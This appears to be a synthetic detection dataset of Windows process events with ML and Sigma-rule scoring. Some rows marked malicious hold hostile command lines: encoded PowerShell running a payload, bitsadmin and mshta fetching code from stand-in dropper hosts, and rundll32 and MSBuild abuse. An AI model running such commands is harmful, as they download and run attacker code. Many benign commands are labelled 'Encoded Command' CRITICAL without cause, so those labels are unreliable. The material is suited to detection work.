UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label,parent_process_name,child_process_name,is_known_lolbin,is_scripting_engine,command_line_length,command_line_entropy,has_suspicious_flag,contains_url,contains_ip_address,has_base64_pattern,argument_count,suspicious_argument_ratio,has_encoded_command,has_download_indicator,process_ancestry_depth,parent_is_office_app,parent_is_browser,parent_is_script_engine,chain_hash,hour_of_day,is_off_hours,is_weekend,minute_of_hour,parent_child_pair_rarity,command_length_zscore,entropy_zscore,is_system_user,user_encoded,integrity_encoded,sigma_match,sigma_rule_name,sigma_level,sigma_mitre_tags,ml_anomaly_score,chain_risk_score,chain_description,chain_matched_pattern,final_verdict,priority,confidence,explanation
2024-07-05T02:29:08.991Z,{0D085057-F189-44D8-AC33-E57798A8C907},47171,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-VM | Where-Object {$_.State -eq 'Off'} | Start-VM""",C:\Windows\System32\cmd.exe,cmd.exe,34632,CORP\admin,High,0,,,gray_area,1,3,1,1,79,4.7294,0,0,0,0,10,0.0,0,0,2,0,0,1,4082297620,2,1,0,29,1.3846,1.6959799278991314,1.3424810947676398,0,3,2,False,None,none,,81.50393561409699,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,57.7,"ANOMALY SCORE: 82/100 | Unusual factors: spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); unusual number of arguments: 10.00 (baseline: 3.17±2.29, z=3.0); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3); hour_of_day: 2.00 (baseline: 12.28±4.99, z=2.1)"
2024-07-01T01:31:49.148Z,{B49AD7AE-C699-4E3A-8721-03A4326D42EC},63114,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Windows\System32\cmd.exe,WINWORD.EXE /n,31018,CORP\agarwal,Medium,1,T1059.001,PowerShell Encoded Command,malicious,1,3,1,1,206,4.5641,1,0,0,1,8,0.375,1,0,2,0,0,1,4082297620,1,1,0,31,1.3846,6.787929120409527,1.0949664234761654,0,12,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,96.41800018598175,25,"cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours, +10 encoded command, +5 suspicious flags]",False,ALERT,CRITICAL,99.6,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 96 | Chain Risk: 25
2024-07-05T04:57:25.347Z,{234A5297-6166-4114-A4DF-B53FCBF892DF},36454,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -File C:\Scripts\nightly-backup.ps1,C:\Windows\System32\cmd.exe,cmd.exe,4002,CORP\admin,High,0,,,gray_area,1,3,1,1,50,4.5815,0,0,0,0,3,0.0,0,0,2,0,0,1,4082297620,4,1,0,57,1.3846,0.5332513721290413,1.121020599401584,0,3,2,False,None,none,,71.83871979722952,10,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +10 off-hours],False,ALERT,MEDIUM,51.2,"ANOMALY SCORE: 72/100 | Unusual factors: spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); execution during off-hours (midnight-5am): 1.00 (baseline: 0.10±0.30, z=3.0); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-05T09:51:55.549Z,{DEF9C614-BF8E-4416-843E-F77BA73E4DB9},13252,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,24972,CORP\itops,High,0,,,benign,0,3,1,1,98,4.7762,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,9,0,0,51,1.231,2.4577676023691906,1.4125578438084203,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.19312868899799,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-05T01:49:13.141Z,{34E70036-19B1-42FE-B8EB-84A6348AF128},65307,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c svc393.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,22949,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious,1,1,1,0,135,5.1307,1,0,0,0,5,0.2,0,0,2,0,0,1,606078729,1,1,0,49,3.9031,3.9412488631793052,1.943374244128006,0,0,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,95.10807957395895,65,"cmd.exe → rundll32.exe: Command shell invoking rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.5,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 95 | Chain Risk: 65
2024-07-02T16:15:26.503Z,{A2A7A742-36F7-4708-8C8E-9DC6284BB035},63992,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4925,CORP\itops,High,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,16,0,0,15,1.231,2.5780498667591996,1.4642169857295075,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,43.46069621386303,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 43 | Chain Risk: 5
2024-07-02T13:31:32.830Z,{2B22B55C-9CCF-4407-974D-39A365AFC669},51128,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\patch587.csproj,C:\Windows\System32\cmd.exe,cmd.exe,44737,CORP\jsmith,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,83,5.0157,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,13,0,0,31,3.9031,1.8563562804191438,1.7711771043910454,0,9,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,74.2149117481396,65,cmd.exe → msbuild.exe: Command shell spawning MSBuild,True,ALERT,CRITICAL,97.4,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 74 | Chain Risk: 65
2024-07-01T12:55:41.129Z,{7D9F65D2-A70D-4EC8-8F0E-30B07EEF5173},46968,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57759,CORP\sysadmin,High,0,,,benign,1,3,1,1,89,4.9011,1,0,0,0,9,0.1111,0,0,2,0,0,1,4082297620,12,0,0,55,1.3846,2.0969208091991622,1.599578911227083,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,48.21740037800775,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 48 | Chain Risk: 5
2024-07-03T22:22:22.164Z,{7760E599-4652-4183-8A67-E1815329F658},57042,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document12.docm",33809,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious,12,4,1,1,234,4.7862,1,0,0,1,8,0.375,1,0,2,1,0,0,1267013000,22,0,0,22,3.9031,7.910563588049614,1.427531508133373,0,12,1,True,Office Application Spawning Command Shell,critical,attack.t1204.002,100.0,100,"excel.exe → cmd.exe: Excel spawning command shell (macro indicator) [Modifiers: +20 Office→Script chain, +10 encoded command, +5 suspicious flags]",True,ALERT,CRITICAL,100.0,Sigma rule matched: Office Application Spawning Command Shell | ML Score: 100 | Chain Risk: 100
2024-07-06T03:55:51.237Z,{F12141FB-25A9-4217-94DB-16F9E451D977},55719,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\explorer.exe,explorer.exe,63091,CORP\klee,Medium,1,T1218.011,Rundll32 JavaScript,malicious,0,1,1,0,77,4.9254,1,0,0,0,3,0.3333,0,0,1,0,0,0,788896773,3,1,1,55,3.9031,1.6157917516391251,1.6359649155367193,0,6,1,True,Rundll32 JavaScript Execution,critical,attack.t1218.011,99.29481467155534,40,"explorer.exe → rundll32.exe: Explorer launching rundll32 [Modifiers: +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.9,Sigma rule matched: Rundll32 JavaScript Execution | ML Score: 99 | Chain Risk: 40
2024-07-01T12:42:55.501Z,{378BB4C8-B755-4A61-9EB8-B986332FD928},35584,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,64302,CORP\sysadmin,High,0,,,benign,1,3,1,1,112,4.5569,1,0,0,0,12,0.0833,0,0,2,0,0,1,4082297620,12,0,0,42,1.3846,3.0190848361892337,1.084185385162199,0,10,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,63.010846781710654,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,96.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 63 | Chain Risk: 5
2024-07-05T04:32:17.150Z,{8283D610-675B-4D08-A90B-9CD9ACF58DD0},51331,C:\Windows\System32\bitsadmin.exe,bitsadmin /transfer job9634 http://dropper-srv6968.ru/runtime784.exe C:\Users\Public\driver280.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,30794,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,98,4.866,1,1,0,0,5,0.2,0,1,2,0,0,1,1514001697,4,1,0,32,3.9031,2.4577676023691906,1.547021349446498,0,0,1,True,BITSAdmin File Download,high,attack.t1197,89.74317697225555,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 90
2024-07-05T19:52:18.744Z,{FBED7CB6-80FE-48DB-A8B3-903E3404DF11},45380,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded4817.exe C:\Users\Public\encoded4461.txt,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,13410,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious,4,8,1,0,84,4.3991,1,0,0,0,4,0.25,0,0,2,0,0,1,2657444117,19,0,0,52,3.9031,1.896450368549147,0.8479009621144399,0,6,1,True,Certutil Base64 Encode or Decode,high,attack.t1140,90.2489702860935,65,powershell.exe → certutil.exe: PowerShell invoking certutil,True,ALERT,CRITICAL,99.0,Sigma rule matched: Certutil Base64 Encode or Decode | ML Score: 90 | Chain Risk: 65
2024-07-04T17:30:37.410Z,{8453B606-78BA-4497-9515-50C97D9F7BBB},36020,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,34201,CORP\jsmith,Medium,0,,,benign,0,3,1,1,92,4.6231,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,17,0,0,30,1.231,2.2172030735891717,1.1833110429933886,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,39.70694103536282,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.0,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 40 | Chain Risk: 5
2024-07-04T12:21:50.363Z,{83A1451D-4DFD-4E57-9084-62B0D08364FA},51421,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4058,CORP\klee,Medium,0,,,gray_area,0,1,1,0,57,4.4964,0,0,0,0,3,0.0,0,0,1,0,0,0,788896773,12,0,0,21,3.9031,0.813909989039063,0.9935947159962341,0,6,1,False,None,none,,71.57620754679007,25,explorer.exe → rundll32.exe: Explorer launching rundll32,True,ALERT,MEDIUM,51.1,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4)"
2024-07-01T16:18:26.411Z,{BDC7EBFC-398A-4916-BD13-F323790D8321},59050,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,45621,CORP\itops,High,0,,,gray_area,1,19,1,0,76,4.7663,0,0,0,0,5,0.0,0,0,2,0,0,1,2398546659,16,0,0,18,3.9031,1.575697663509122,1.3977339161267168,0,5,2,False,None,none,,71.93094619246126,55,cmd.exe → regsvr32.exe: Command shell invoking regsvr32,True,ALERT,MEDIUM,51.3,"ANOMALY SCORE: 72/100 | Unusual factors: unusual parent-child process relationship: 3.90 (baseline: 1.63±0.36, z=6.4); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-04T04:34:21.828Z,{CF26A060-0412-4830-A478-0FA459975194},57339,C:\Windows\System32\bitsadmin.exe,bitsadmin /transfer job1678 http://cobaltstrike5366.org/runtime637.exe C:\Users\Public\svc677.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,36424,CORP\klee,Medium,1,T1197,BITSAdmin Download,malicious,4,24,1,0,97,4.843,1,1,0,0,5,0.2,0,1,2,0,0,1,1514001697,4,1,0,34,3.9031,2.4176735142391874,1.5125819214991063,0,6,1,True,BITSAdmin File Download,high,attack.t1197,89.72082196253423,90,"powershell.exe → bitsadmin.exe: PowerShell invoking bitsadmin [Modifiers: +15 URL in command, +10 off-hours, +5 suspicious flags]",True,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 90
2024-07-05T16:07:36.116Z,{4409A8E0-7F0D-4304-96C7-589255DC8986},18556,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-EventLog -LogName System -Newest 50""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,51797,CORP\jsmith,Medium,0,,,benign,1,3,1,1,76,4.5494,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,16,0,0,7,1.3846,1.575697663509122,1.072955136918485,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,48.178761850636874,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 48 | Chain Risk: 5
2024-07-05T11:05:19.788Z,{BC402125-4E04-45DE-ACC2-55E0CD71B68C},31371,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-WmiObject Win32_Process | Select-Object Name, ProcessId, @{Name='Memory(MB)';Expression={[math]::Round($_.WorkingSetSize/1MB,2)}} | Sort-Object 'Memory(MB)' -Descending | Select -First 20 | Format-Table -AutoSize""",C:\Windows\System32\cmd.exe,cmd.exe,10710,CORP\sysadmin,High,0,,,gray_area,1,3,1,1,242,5.3443,0,0,0,0,20,0.0,0,0,2,0,0,1,4082297620,11,0,0,5,1.3846,8.23131629308964,2.2632117141090027,0,10,2,False,None,none,,94.69786731261293,0,cmd.exe → powershell.exe: No known suspicious pattern,False,ALERT,MEDIUM,66.5,"ANOMALY SCORE: 95/100 | Unusual factors: unusually long command line: 242.00 (baseline: 36.70±24.93, z=8.2); command length significantly above baseline: 8.23 (baseline: -0.00±1.00, z=8.2); unusual number of arguments: 20.00 (baseline: 3.17±2.29, z=7.3); spawned by script engine: 1.00 (baseline: 0.06±0.24, z=3.9); deep process chain (possible multi-stage): 2.00 (baseline: 1.16±0.37, z=2.3)"
2024-07-03T14:17:33.065Z,{0BD6F01D-52AE-4D47-B24C-63C3038AD978},18232,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,47682,CORP\admin,High,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,14,0,0,17,1.231,2.5780498667591996,1.4642169857295075,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.46337891130649,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.1,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 41 | Chain Risk: 5
2024-07-02T14:39:43.453Z,{986D7E92-12BC-406E-A420-660282B0F457},57358,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ChildItem -Path C:\Logs -Recurse -Filter *.log""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,15237,CORP\itops,High,0,,,benign,0,3,1,1,87,4.6553,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,14,0,0,39,1.231,2.0167326329391564,1.2315262421197382,0,5,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,38.42487181702565,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 38 | Chain Risk: 5
2024-07-05T10:35:10.338Z,{2D065930-4311-4C55-8689-2763142D753A},37690,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Disk | Get-Partition | Get-Volume""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,28942,CORP\mjones,Medium,0,,,benign,0,3,1,1,74,4.4639,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,10,0,0,35,1.231,1.495509487249116,0.9449303069401356,0,0,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,41.897372725483564,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.2,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 42 | Chain Risk: 5
2024-07-03T09:42:50.834Z,{1E47C5B0-0786-4503-858A-DDCDFFF2EC90},47848,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb6877681.cab C:\Windows\SoftwareDistribution\Download\update_kb6877681.cab,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s BITS,38536,NT AUTHORITY\SYSTEM,System,0,,,gray_area,2,24,1,0,177,4.8244,1,1,0,0,8,0.125,0,1,1,0,0,0,583731811,9,0,0,42,3.9031,5.625200564639437,1.4847309058546934,1,2,3,True,BITSAdmin File Download,high,attack.t1197,90.40807601024835,30,"svchost.exe → bitsadmin.exe: No known suspicious pattern [Modifiers: +15 URL in command, +10 LOLBin child, +5 suspicious flags]",False,ALERT,CRITICAL,99.0,Sigma rule matched: BITSAdmin File Download | ML Score: 90 | Chain Risk: 30
2024-07-05T10:50:13.833Z,{B11D3C4A-6860-4FD2-A1E2-DE93E211D920},14562,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,53785,CORP\jsmith,Medium,0,,,benign,0,3,1,1,81,4.4666,1,0,0,0,8,0.125,0,0,1,0,0,0,945137867,10,0,0,50,1.231,1.7761681041591375,0.9489731963078728,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,38.86896763505578,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,93.9,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 39 | Chain Risk: 5
2024-07-05T08:02:54.883Z,{2968B7FE-DD86-4625-B25A-AF53E1E4465C},1805,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,17026,CORP\admin,High,0,,,benign,0,3,1,1,101,4.8107,1,0,0,0,9,0.1111,0,0,1,0,0,0,945137867,8,0,0,2,1.231,2.5780498667591996,1.4642169857295075,0,3,2,True,PowerShell Encoded Command Execution,high,attack.t1059.001,43.48504555919678,5,explorer.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.3,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 43 | Chain Risk: 5
2024-07-01T16:34:39.156Z,{980E3AC0-9C3B-4AFF-9C76-362D331DA58B},19184,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter *""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,6478,CORP\jsmith,Medium,0,,,benign,1,3,1,1,92,4.6231,1,0,0,0,8,0.125,0,0,2,0,0,1,4082297620,16,0,0,34,1.3846,2.2172030735891717,1.1833110429933886,0,9,1,True,PowerShell Encoded Command Execution,high,attack.t1059.001,47.67944616471156,5,cmd.exe → powershell.exe: No known suspicious pattern [Modifiers: +5 suspicious flags],False,ALERT,CRITICAL,94.8,Sigma rule matched: PowerShell Encoded Command Execution | ML Score: 48 | Chain Risk: 5
2024-07-06T03:20:53.987Z,{FA445198-2B84-45C7-9E16-237F7E2C5AEA},52976,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://dropper-srv1752.net/script510.hta"""""")",C:\Windows\explorer.exe,cmd.exe,14974,CORP\agarwal,Medium,1,T1218.005,Mshta Remote HTA,malicious,0,5,1,1,106,4.7853,0,1,0,0,3,0.0,0,0,1,0,0,0,333442925,3,1,1,20,3.9031,2.7785203074092153,1.4261838783441276,0,12,1,True,Mshta Remote HTA Execution,high,attack.t1218.005,90.28588177730083,65,"explorer.exe → mshta.exe: Explorer launching HTA handler [Modifiers: +15 URL in command, +10 off-hours]",True,ALERT,CRITICAL,99.0,Sigma rule matched: Mshta Remote HTA Execution | ML Score: 90 | Chain Risk: 65
2024-07-02T20:43:38.241Z,{A8875755-7DFD-438D-9B5E-965A226F737D},27598,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\svc650.csproj,C:\Windows\System32\cmd.exe,cmd.exe,16629,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious,1,34,1,0,81,4.9481,0,0,0,0,2,0.0,0,0,2,0,0,1,442785036,20,0,0,43,3.9031,1.7761681041591375,1.6699551335543632,0,0,1,True,MSBuild Inline Task Execution,high,attack.t1127.001,74.8970452041003,65,cmd.exe → msbuild.exe: Command shell spawning MSBuild,True,ALERT,CRITICAL,97.5,Sigma rule matched: MSBuild Inline Task Execution | ML Score: 75 | Chain Risk: 65
